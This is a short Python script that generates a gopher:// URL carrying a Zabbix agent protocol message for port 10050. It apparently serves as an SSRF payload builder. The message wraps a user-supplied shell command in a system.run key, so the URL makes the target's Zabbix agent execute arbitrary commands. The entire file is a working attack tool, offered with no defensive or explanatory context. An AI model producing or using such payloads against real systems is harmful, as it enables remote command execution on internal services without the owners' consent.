import struct
import urllib.parse

command = input("Command to run: ")

header = "ZBXD\x01"
key = f'system.run[({command})]'
print("URL: gopher://localhost:10050/_", end="")
print(urllib.parse.quote_plus(header).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"), end="")
print(urllib.parse.quote_plus(struct.pack("<Q",len(key)+2).decode()).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"), end="")
print(urllib.parse.quote_plus(key).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"), end="")
